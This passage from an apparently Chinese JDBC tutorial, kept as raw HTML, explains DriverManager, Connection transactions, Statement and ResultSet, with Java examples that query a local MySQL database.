operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//5. 执行sql</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//返回受影响的行数</span>        <span class="token comment">//6. 处理结果</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//7. 释放资源</span>        stmt<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-jdbc-api详解"><a class="markdownIt-Anchor" href="#3-jdbc-api详解">#</a> 3、JDBC API 详解</h1><ul><li>DriverManager</li><li>Connection</li><li>Statement</li><li>ResultSet</li><li>PreparedStatement</li></ul><h2 id="31-drivermanager"><a class="markdownIt-Anchor" href="#31-drivermanager">#</a> 3.1 DriverManager</h2><ul><li>DriverManager（驱动管理类）作用：<ol><li>注册驱动</li><li>获取数据库连接</li></ol></li><li>DriverManager 是一个工具类，里面都是静态方法</li></ul><table><thead><tr><th>描述</th><th>方法名</th></tr></thead><tbody><tr><td>static Connection</td><td>getConnection(Stirng url, String user, String password)</td></tr></tbody></table><p>参数：</p><ol><li>URL：连接路径</li></ol><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>语法：jdbc:mysq://ip 地址 (域名): 端口号 / 数据库名称？参数键值对 1 &amp; 参数键值对 2</p><p>示例：jdbc:mysql://127.0.0.1:3306/db1</p><p>细节：</p><ul><li>如果连接的是本机 mysql 服务器，并且 mysql 服务默认端口号是 3306，则 url 可以简写为 jdbc:mysql/// 数据库名称？参数键值对</li><li>配置 useSSL=false 参数，禁用安全连接方式，解决警告提示:jdbc:mysql///db2?useSSL=false</li></ul></blockquote><ol start="2"><li>user：用户名</li><li>password：密码</li></ol><h2 id="32-connection"><a class="markdownIt-Anchor" href="#32-connection">#</a> 3.2 Connection</h2><ul><li><p>Connection (数据库连接对象) 作用：</p><ol><li><p>获取执行 SQL 的对象</p><ul><li>普通执行 SQL 对象 <code>Statement create Statement()</code></li><li>预编译 SQL 的执行 SQL 对象：防止 SQL 注入： <code>PreparedStatement preparedStatement(sql)</code></li><li>执行存储过程的对象： <code>CallableStatement prepareCall(sql)</code></li></ul></li><li><p>管理事务</p><ul><li><p>MySQL 事务管理</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>开启事务：BEGIN;/START TRANSACTION;</p><p>提交事务：COMMIT;</p><p>回滚事务：ROLLBACK;</p><p>MYSQL 默认自动提交事务</p></blockquote></li><li><p>JDBC 事务管理：Connection 接口中定义了 3 个对应方法</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>开启事务：setAutoCommit (boolean autoCommit)：true 为自动提交事务，false 为手动提交事务</p><p>提交事务：commit ()</p><p>回滚事务：rollback ()</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">try &#123;    <span class="token comment">//开启事务</span>    conn<span class="token punctuation">.</span>setAutoCommit<span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//执行sql1，并处理结果</span>    <span class="token keyword">int</span> count1 <span class="token operator">=</span> stmt<span class="token punctuation">.</span>executeUpdate<span class="token punctuation">(</span>sql1<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span>println<span class="token punctuation">(</span>count1<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//执行sql2，并处理结果</span>    <span class="token keyword">int</span> count2 <span class="token operator">=</span> stmt<span class="token punctuation">.</span>executeUpdate<span class="token punctuation">(</span>sql2<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span>println<span class="token punctuation">(</span>count2<span class="token punctuation">)</span><span class="token punctuation">;</span>&#125; catch <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> &#123;    <span class="token comment">//回滚事务</span>    conn<span class="token punctuation">.</span><span class="token keyword">rollback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    throw new RuntimeException<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>&#125;<span class="token comment">//提交事务</span>conn<span class="token punctuation">.</span><span class="token keyword">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ol></li></ul><h2 id="33-statement"><a class="markdownIt-Anchor" href="#33-statement">#</a> 3.3 Statement</h2><ul><li>Statement 作用：<ol><li>执行 SQL 语句</li></ol></li><li>执行 SQL 语句：</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>int executeUpdate (sql) 执行 DML，DDL 语句</p><blockquote><p>返回值：(1) DML 语句影响的行数(2) DDL 语句执行后，执行成功也可能返回 0（DDL 不报异常一般就是成功）</p></blockquote><p>ResultSet executeQuery (sql) 执行 DQL 语句</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>返回值：ResultSet 结果集对象</p></blockquote></blockquote><h2 id="34-resultset"><a class="markdownIt-Anchor" href="#34-resultset">#</a> 3.4 ResultSet</h2><ul><li><p>ResultSet (结果集对象) 作用：</p><ol><li><p>封装了 DQL 查询语句的结果</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>ResultSet stmt.executeQuery (sql): 执行 SQL 语句，返回 ResultSet 对象</p></blockquote></li></ol></li><li><p>获取查询结果</p></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>boolean next ():(1) 将光标从当前位置移动向下一行(2) 判断当前行是否为有效行</p><blockquote><p>返回值：</p><ul><li>true：有效行，当前行有数据</li><li>false：无效行，当前行没有数据</li></ul></blockquote><p>xxx getXxx (参数)：获取数据</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>xxx：参数类型，如 int getint (参数); String getString (参数)</p><p>参数：</p><ul><li>int：列的编号，从 1 开始</li><li>String：列的名称</li></ul></blockquote></blockquote><ul><li>使用步骤<ol><li>游标向下移动一行，并判断该行是否有数据：next ()</li><li>获取数据：getXxx (参数)</li></ol></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//循环判断游标是否为最后一行末尾</span><span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//获取数据</span>    rs<span class="token punctuation">.</span><span class="token function">getXxx</span><span class="token punctuation">(</span>参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>jdbc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DriverManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCDemo5_ResultSet</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * ResultSet     * @throws Exception     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testResultSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Statement</span> statement <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM ACCOUNT"</span><span class="token punctuation">;</span>        <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//处理结果</span>        <span class="token comment">//光标向下移动一行，并且判断当前行是否有数据</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//获取数据</span>            <span class="token keyword">int</span> anInt <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> string <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> anInt1 <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> money <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>id <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        statement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 